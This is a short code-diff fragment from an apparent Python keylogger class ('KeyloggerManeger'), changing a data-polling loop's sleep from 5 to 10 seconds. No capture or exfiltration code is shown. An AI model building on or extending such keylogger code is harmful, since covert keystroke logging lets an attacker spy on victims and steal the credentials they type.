@@ -19,7 +19,7 @@ class KeyloggerManeger:
 
     def f(self):
         while True:
-            time.sleep(5)
+            time.sleep(10)
             self.getdata()
 
 
